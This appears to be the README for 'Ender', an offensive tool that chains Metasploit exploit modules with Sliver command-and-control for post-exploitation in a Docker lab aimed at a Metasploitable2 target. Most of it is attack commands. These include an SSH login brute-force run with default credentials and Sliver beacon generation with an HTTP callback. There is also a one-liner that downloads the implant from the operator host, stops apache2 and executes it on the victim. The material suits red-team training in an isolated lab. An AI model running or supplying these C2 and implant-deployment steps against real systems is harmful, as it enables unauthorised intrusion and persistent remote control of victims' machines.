# Ender
Exploit Engine for Multiple C2s interlaced with Eshu for Post-Exploitation

Go to Ender directory
```bash
docker compose up -d --build
```

Testing the connectivity between server and metasploit

To try out CLI
Terminal 1:
```bash
docker exec -it operator /bin/bash
python ender_server/server.py
```

Terminal 2:
```bash
docker exec -it operator /bin/bash
python ender_client/client.py
```

Enter: 
```bash
connect
```

To test search exploits / auxiliary, type:
```bash
search exploit/auxiliary "module_name"
```

To test run exploit, type:
```bash
run exploit/auxiliary "module_name"
```

Type in parameters when needed

Example of "run exploit" with scanner/ssh/ssh_login:
```bash
[SERVER] Received: [+] Connected to Metasploit!
Enter message (or 'quit' to exit): run auxiliary scanner/ssh/ssh_login
[SERVER] Received: Please enter the USERNAME: 
Enter message (or 'quit' to exit): msfadmin
[SERVER] Received: Please enter the PASSWORD: 
Enter message (or 'quit' to exit): msfadmin
[SERVER] Received: Please enter the RHOSTS: 
Enter message (or 'quit' to exit): 10.1.1.3
[SERVER] Received: Please enter the THREADS: 
Enter message (or 'quit' to exit): 5
[SERVER] Received: Please enter the RPORT: 
Enter message (or 'quit' to exit): 
[SERVER] Received: {"job_id": 0, "uuid": "KFgCxXFIFQ3i5iIzQeE9FHBJ"}
```

## To run Eshu code:
Start up terminal
```console
docker exec -it operator /bin/bash
```

To test network connection to vulnerable machine(VM)
```bash
ping 10.1.1.3
nmap -l metasploitable2
```

#### Firstly, setting up Sliver Server
In one terminal (Sliver Server):
```bash
docker exec -it operator /bin/bash
sliver-server
> new-operator --name operator1 --lhost localhost
> multiplayer
```

#### Secondly, setting up Sliver Client instance
In second terminal (Sliver Client):
```bash
docker exec -it operator /bin/bash
sliver-client import operator1_localhost.cfg
sliver-client
> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
> http	
```

#### Thirdly, set up server to transfer implant for exploitation
In third terminal (operator workspace):
```bash
docker exec -it operator /bin/bash
python -m http.server 8080
```

#### Fourth, download and run implant on vulnerable machine
In fourth terminal (metasploitable2):
```bash
docker exec -it metasploitable2 /bin/bash
curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service apache2 stop && ./testbeacon
```
Check the sliver-client terminal to see the beacon connection.

#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
```bash 
python eshuCLP/main.py
```

#### Clean Up
To stop all running containers
```console
docker compose stop
```

If stopped, start again with
```console
docker-compose start
```

To kill and remove all the running containers
```console
docker compose down
```
